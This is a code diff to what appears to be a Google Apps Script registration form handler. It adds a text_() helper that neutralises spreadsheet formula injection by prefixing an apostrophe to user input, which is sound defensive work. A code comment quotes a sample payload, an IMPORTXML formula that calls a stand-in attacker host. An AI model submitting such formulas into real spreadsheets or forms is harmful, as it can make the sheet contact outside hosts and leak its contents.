@@ -119,6 +119,18 @@ function sheet_() {
   return sh;
 }
 
+// Google Sheets parses a cell whose text begins with = + - @ as a FORMULA.
+// Two consequences, both live-tested: "+91 98765 43210" is stored as #ERROR!,
+// destroying the number the whole register exists to dial; and a submitted
+// name like '=IMPORTXML("http://attacker/", "//a")' RUNS inside the team's
+// sheet, which is formula injection through a public form. A leading
+// apostrophe forces the value to be stored as text and is not part of it —
+// getValues() returns the string without it, so the dedupe still matches.
+function text_(v) {
+  const s = String(v == null ? '' : v);
+  return /^[=+\-@]/.test(s) ? "'" + s : s;
+}
+
 function json_(obj) {
   return ContentService.createTextOutput(JSON.stringify(obj))
     .setMimeType(ContentService.MimeType.JSON);
@@ -158,9 +170,10 @@ function doPost(e) {
     }
 
     const seat = n + 1;
+    // Every user-supplied cell goes through text_() — see above.
     sh.appendRow([
-      body.date || '', body.name || '', email, body.whatsapp || '',
-      body.profession || '', body.source || '', seat, '',
+      text_(body.date), text_(body.name), text_(email), text_(body.whatsapp),
+      text_(body.profession), text_(body.source), seat, '',
     ]);
     return json_({ ok: true, seat: seat, claimed: seat, already_registered: false });
   } finally {
